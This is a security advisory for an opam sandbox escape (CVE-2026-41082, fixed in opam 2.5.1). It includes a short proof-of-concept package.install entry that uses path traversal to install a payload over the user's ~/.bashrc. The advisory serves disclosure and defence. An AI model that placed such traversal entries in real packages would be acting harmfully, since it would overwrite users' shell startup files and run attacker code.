# [M] opam install sandbox escape

## Summary
Severity: Medium
Advisory: OSEC-2026-03
Aliases: CVE-2026-41082
Ecosystem: opam
CVSS: 5.7 (CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N)
Published: 2026-04-15
Source: https://osv.dev/vulnerability/OSEC-2026-03
Type: osv

## Affected
- opam: `opam-devel` — affected >=0 <2.5.1, >=0 <d7283e3b5845447ee618794d87cfe224dd980c8f, >=0 <c8fcf65779fe7048f9b5ef59886bfa9c5d102d84

## Details
## Summary

`.install` files do not validate whether they are inside the package area, and so can bypass sandboxing.

## Exploit

In a `package.install` file, this installs a file as ``~/.bashrc`:
```
bin: [
  "payload.sh" {"../../../.bashrc"}
]
```

## Timeline

- 2026-04-11: Anil forwarded the issue from Andrew Nesbitt to the OCaml security team
- 2026-04-11: Kate developed a fix
- 2026-04-15: opam 2.5.1 was released with the fix

## References
- https://github.com/ocaml/opam/pull/6897
- https://github.com/ocaml/opam/pull/6898
